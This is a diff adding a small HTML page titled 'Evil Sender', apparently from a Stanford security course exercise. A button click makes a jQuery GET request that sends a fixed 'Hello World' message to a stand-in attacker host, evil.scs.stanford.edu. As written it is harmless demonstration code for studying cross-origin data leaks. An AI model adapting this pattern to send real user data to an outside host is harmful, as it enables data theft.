@@ -1,0 +1,22 @@
+<html>
+  <head>
+    <title>Evil Sender</title>
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>
+    <script type="text/javascript">
+      $(document).ready(function () {
+        $("#send").click(function() {
+          sendToEvil('Hello World');
+        });
+
+        function sendToEvil(msg) {
+          $.get('http://evil.scs.stanford.edu/?msg=' + msg);
+        }
+      });
+    </script>
+  </head>
+
+  <body>
+    <input id="send" type="submit" value="Send!"/>
+  </body>
+</html>
+
